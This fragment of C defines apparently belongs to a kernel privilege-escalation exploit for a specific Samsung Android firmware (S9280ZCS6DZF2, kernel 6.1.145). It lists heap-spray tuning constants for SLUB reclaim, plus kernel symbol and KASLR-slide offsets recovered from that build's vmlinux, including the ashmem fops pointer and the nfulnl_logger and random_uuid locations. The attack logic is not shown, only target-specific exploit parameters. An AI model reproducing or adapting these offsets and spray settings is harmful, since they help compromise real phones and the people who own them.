...
/* SLUB rounds mm_struct to kmalloc-1k: slabinfo obj_size=1024 */
#define MM_STRUCT_SLAB_SZ 0x400
/* S928U hardware-tested conservative baseline: 28 sends, 2 drain triggers */
#define SKB_RECLAIM_SENDS 28
#define APP_SLIDE_RECLAIM_SENDS 28
#define MM_DRAIN_TRIGGERS 2
...
/* Offsets recovered from exact S9280ZCS6DZF2 vmlinux.elf.
 * Kernel: 6.1.145-android14-11-3254743-abS9280ZCS6DZF2
 * boot.img SHA-256: 5557e0d4eb17376ce9b5e8909561ae4d4c7619a76f9911ec444d393c96780caf
 * kernel SHA-256:   899512a221f6f6760b9c921035bc49756926944fcc9472031048b90cd7189d98
 */

/* ashmem_miscs + offsetof(miscdevice, fops)=0x10 = 0x23bb5a0 + 0x10 */
...
/* Differs from S928U: nfulnl_logger name string at 0x16a65c5 */
#define SLIDE_NFULNL_LOGGER_OFF 0x016a65c5ULL
...
#define SLIDE_RANDOM_UUID_DATA_OFF 0x02376330ULL
